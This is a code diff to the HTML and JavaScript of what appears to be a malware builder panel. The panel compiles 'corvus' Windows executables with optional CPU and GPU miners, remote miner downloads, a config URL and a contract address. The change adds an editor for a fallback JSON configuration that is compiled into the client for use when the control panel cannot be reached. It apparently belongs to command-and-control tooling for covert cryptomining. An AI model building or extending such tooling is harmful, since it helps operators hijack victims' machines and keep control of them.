@@ -34,18 +34,9 @@
                 </div>
             </div>
 
-            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 12px; margin-bottom: 12px;">
-                <div class="form-group">
-                    <label for="fileName" style="color: #b3b3b3; display: block; margin-bottom: 5px;">Output file name <small style="color: #666;">(optional)</small></label>
-                    <input type="text" id="fileName" placeholder="corvus_&lt;timestamp&gt;.exe" style="width: 100%; padding: 6px; background-color: #262626; color: #b3b3b3; border: 2px solid #440000; font-family: 'Ubuntu Mono', monospace; font-size: 0.9em;">
-                </div>
-                <div class="form-group">
-                    <label for="embeddedConfig" style="color: #b3b3b3; display: block; margin-bottom: 5px;">Embedded fallback config</label>
-                    <select id="embeddedConfig" style="width: 100%; padding: 6px; background-color: #262626; color: #b3b3b3; border: 2px solid #440000; font-family: 'Ubuntu Mono', monospace; font-size: 0.9em;">
-                        <option value="auto">auto (embed if found)</option>
-                        <option value="none">none</option>
-                    </select>
-                </div>
+            <div class="form-group" style="margin-bottom: 12px;">
+                <label for="fileName" style="color: #b3b3b3; display: block; margin-bottom: 5px;">Output file name <small style="color: #666;">(optional)</small></label>
+                <input type="text" id="fileName" placeholder="corvus_&lt;timestamp&gt;.exe" style="width: 100%; padding: 6px; background-color: #262626; color: #b3b3b3; border: 2px solid #440000; font-family: 'Ubuntu Mono', monospace; font-size: 0.9em;">
             </div>
 
             <h3 style="color: #aa0000; font-size: 1em; letter-spacing: 1px; margin: 18px 0 10px 0;">Features</h3>
@@ -68,6 +59,25 @@
                     <small style="color: #666;">— adds ~47 MiB with CPU+GPU; uncheck for a download-only build</small>
                 </label>
             </div>
+
+            <h3 style="color: #aa0000; font-size: 1em; letter-spacing: 1px; margin: 18px 0 10px 0;">Fallback configuration</h3>
+            <p style="color: #666; font-size: 0.8em; margin: 0 0 10px 0;">
+                Compiled into the client and used when the panel cannot be reached.
+            </p>
+
+            <div style="display: grid; grid-template-columns: 1fr auto auto; gap: 10px; align-items: center; margin-bottom: 10px;">
+                <select id="embeddedMode" style="width: 100%; padding: 6px; background-color: #262626; color: #b3b3b3; border: 2px solid #440000; font-family: 'Ubuntu Mono', monospace; font-size: 0.9em;">
+                    <option value="panel" {{if eq .embeddedMode "panel"}}selected{{end}}>Use the current panel configuration</option>
+                    <option value="custom" {{if eq .embeddedMode "custom"}}selected{{end}}>Custom JSON</option>
+                    <option value="none" {{if eq .embeddedMode "none"}}selected{{end}}>No fallback</option>
+                </select>
+                <button type="button" id="loadDerivedBtn" class="btn btn-secondary btn-sm" title="Copy the current panel configuration into the editor">Load current</button>
+                <button type="button" id="saveEmbeddedBtn" class="btn btn-secondary btn-sm" title="Store this fallback for future builds">Save default</button>
+            </div>
+
+            <textarea id="embeddedJson" rows="10" spellcheck="false"
+                      style="width: 100%; padding: 8px; background-color: #1a1a1a; color: #b3b3b3; border: 2px solid #440000; font-family: 'Ubuntu Mono', monospace; font-size: 0.8em; white-space: pre; overflow: auto;">{{.embeddedJSON}}</textarea>
+            <p id="embeddedStatus" style="font-size: 0.85em; display: none; margin: 8px 0 0 0; padding: 4px 8px;"></p>
 
             <div style="margin-top: 18px; display: flex; align-items: center; gap: 12px;">
                 <button type="submit" id="buildBtn" class="btn btn-primary" {{if not .builderReady}}disabled{{end}}><i data-lucide="hammer"></i>Build client</button>
@@ -202,7 +212,8 @@
             config_url: document.getElementById('configUrl').value.trim(),
             contract_address: document.getElementById('contractAddress').value.trim(),
             file_name: document.getElementById('fileName').value.trim(),
-            embedded_config: document.getElementById('embeddedConfig').value,
+            embedded_mode: document.getElementById('embeddedMode').value,
+            embedded_json: document.getElementById('embeddedJson').value,
             cpu_miner: downloadOnly() ? false : document.getElementById('cpuMiner').checked,
             gpu_miner: downloadOnly() ? false : document.getElementById('gpuMiner').checked,
             remote_miners: document.getElementById('remoteMiners').checked,
@@ -245,6 +256,104 @@
         }
     });
 
+    const embeddedMode = document.getElementById('embeddedMode');
+    const embeddedJson = document.getElementById('embeddedJson');
+    const embeddedStatus = document.getElementById('embeddedStatus');
+    const loadDerivedBtn = document.getElementById('loadDerivedBtn');
+    const saveEmbeddedBtn = document.getElementById('saveEmbeddedBtn');
+
+    function embeddedMessage(text, ok) {
+        embeddedStatus.textContent = text;
+        embeddedStatus.style.display = 'block';
+        embeddedStatus.style.backgroundColor = ok ? '#1a3a1a' : '#3a1a1a';
+        embeddedStatus.style.color = ok ? '#5cb85c' : '#d9534f';
+        embeddedStatus.style.borderLeft = '4px solid ' + (ok ? '#5cb85c' : '#d9534f');
+    }
+
+    function syncEmbeddedEditor() {
+        const mode = embeddedMode.value;
+        embeddedJson.disabled = mode === 'none';
+        loadDerivedBtn.disabled = mode === 'none';
+        saveEmbeddedBtn.disabled = mode === 'none';
+        if (mode === 'none') {
+            embeddedJson.style.opacity = '0.5';
+        } else {
+            embeddedJson.style.opacity = '1';
+        }
+    }
+
+    let derivedJSON = '';
+
+    function fillDerived() {
+        if (derivedJSON) {
+            embeddedJson.value = derivedJSON;
+            embeddedMessage('Loaded the current panel configuration.', true);
+        } else {
+            embeddedMessage('The panel configuration is not available yet.', false);
+        }
+    }
+
+    async function loadEmbeddedSettings() {
+        try {
+            const res = await fetch('/api/build/embedded-config');
+            if (!res.ok) return;
+            const data = await res.json();
+            derivedJSON = data.derived_json || '';
+            if (embeddedMode.value !== data.mode) {
+                embeddedMode.value = data.mode;
+            }
+            if (data.mode === 'panel') {
+                embeddedJson.value = derivedJSON;
+            } else if (data.mode === 'custom') {
+                embeddedJson.value = data.custom_json || '';
+            }
+            syncEmbeddedEditor();
+        } catch (err) {
+            console.error('embedded config:', err);
+        }
+    }
+
+    embeddedMode.addEventListener('change', function () {
+        if (embeddedMode.value === 'panel') {
+            fillDerived();
+        }
+        syncEmbeddedEditor();
+    });
+
+    loadDerivedBtn.addEventListener('click', fillDerived);
+
+    saveEmbeddedBtn.addEventListener('click', async function () {
+        const mode = embeddedMode.value;
+        if (mode === 'custom') {
+            try {
+                JSON.parse(embeddedJson.value);
+            } catch (err) {
+                embeddedMessage('Not valid JSON: ' + err.message, false);
+                return;
+            }
+        }
+        saveEmbeddedBtn.disabled = true;
+        try {
+            const res = await fetch('/api/build/embedded-config', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mode: mode, json: embeddedJson.value })
+            });
+            const data = await res.json();
+            if (res.ok && data.success) {
+                embeddedMessage('Saved. Future builds use this fallback.', true);
+                await loadEmbeddedSettings();
+            } else {
+                embeddedMessage('Could not save: ' + (data.error || 'unknown error'), false);
+            }
+        } catch (err) {
+            embeddedMessage('Error: ' + err.message, false);
+        } finally {
+            saveEmbeddedBtn.disabled = false;
+            syncEmbeddedEditor();
+        }
+    });
+
     const remoteEl = document.getElementById('remoteMiners');
     const fallbackEl = document.getElementById('embedFallback');
     const cpuEl = document.getElementById('cpuMiner');
@@ -264,6 +373,8 @@
     fallbackEl.addEventListener('change', syncEmbedOptions);
     syncEmbedOptions();
 
+    syncEmbeddedEditor();
+    loadEmbeddedSettings();
     attachDeleteHandlers();
 })();
 </script>
